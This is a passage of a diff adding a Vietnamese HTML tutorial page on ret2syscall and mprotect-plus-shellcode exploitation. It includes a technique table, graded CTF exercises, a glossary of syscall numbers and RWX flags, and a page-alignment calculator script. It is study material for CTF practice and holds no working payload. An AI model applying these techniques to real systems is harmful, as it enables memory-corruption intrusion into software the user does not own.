+      <tr><td>Cần shellcode tùy ý (ORW)</td><td><b>mprotect</b> + shellcode</td></tr>
+      <tr><td>seccomp cấm execve</td><td>mprotect + <a href="seccomp_orw.html">ORW shellcode</a></td></tr>
+      <tr><td>Dynamic + có libc leak</td><td><a href="ret2libc.html">ret2libc</a> (system)</td></tr>
+      <tr><td>Thiếu pop rdx</td><td><a href="ret2csu.html">ret2csu</a> set rdx</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>syscall qua <code>int 0x80</code>, số khác: execve=11, mprotect=125. Đối số qua ebx/ecx/edx. prot=7 giống nhau.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · ret2syscall</div><p>Static có "/bin/sh": dựng chuỗi execve syscall.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · mprotect + sh</div><p>read shellcode vào bss, mprotect RWX, jmp. Luyện căn trang.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · mprotect + ORW</div><p>seccomp cấm execve: mprotect + shellcode ORW đọc flag.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">ret2syscall</div><p>ROP gọi thẳng syscall.</p></div>
+    <div class="card"><div class="term">mprotect (nr=10)</div><p>Đổi quyền vùng nhớ.</p></div>
+    <div class="card"><div class="term">prot=7</div><p>RWX (R1|W2|X4).</p></div>
+    <div class="card"><div class="term">page align</div><p>addr & ~0xfff.</p></div>
+    <div class="card"><div class="term">SYS_execve</div><p>59 (x86-64).</p></div>
+    <div class="card"><div class="term">shellcraft</div><p>Sinh shellcode.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="rop_basics.html">rop_basics</a> · <a href="ret2csu.html">ret2csu</a>. Kết hợp: <a href="seccomp_orw.html">seccomp_orw</a> (ORW shellcode) · <a href="shellcode_advanced.html">shellcode_advanced</a>.</li>
+    <li>Linux syscall table (x86-64) · pwntools ROP/shellcraft docs.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 2 · Bài 9.</strong> ret2syscall: rax=59 + syscall → execve. mprotect(page&~0xfff, 0x1000, 7) → RWX → jmp shellcode. Nhớ căn trang. Tiếp theo: stack pivot.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("r2s-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("r2s-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  function pv(s){s=(s||"").trim();try{if(/^0x[0-9a-f]+$/i.test(s))return parseInt(s,16);if(/^\d+$/.test(s))return parseInt(s,10);}catch(e){}return null;}
+  var aIn=document.getElementById("aIn"),pR=document.getElementById("pR"),pW=document.getElementById("pW"),pX=document.getElementById("pX"),pOut=document.getElementById("pOut");
+  function calc(){
+    var a=pv(aIn.value);
+    if(a===null){pOut.innerHTML='<div class="ro">nhập địa chỉ hợp lệ</div>';return;}
+    var page=a & ~0xfff;
+    var prot=(pR.checked?1:0)|(pW.checked?2:0)|(pX.checked?4:0);
+    var aligned=(a & 0xfff)===0;
+    pOut.innerHTML=
+      '<div class="ro"><span>địa chỉ</span><b>0x'+(a>>>0).toString(16)+'</b></div>'+
+      '<div class="ro"><span>page = addr & ~0xfff</span><b>0x'+(page>>>0).toString(16)+'</b></div>'+
+      '<div class="ro"><span>đã căn trang?</span><b style="color:'+(aligned?'var(--ok)':'var(--warn)')+'">'+(aligned?'OK (dùng trực tiếp)':'CHƯA → dùng page')+'</b></div>'+
+      '<div class="ro"><span>prot (R1|W2|X4)</span><b>'+prot+(prot===7?' (RWX)':'')+'</b></div>'+
+      '<div class="ro" style="font-size:12px"><span>gọi</span><b>mprotect(0x'+(page>>>0).toString(16)+', 0x1000, '+prot+')</b></div>';
+  }
+  [aIn,pR,pW,pX].forEach(function(e){e.addEventListener("input",calc);e.addEventListener("change",calc);});
+  calc();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
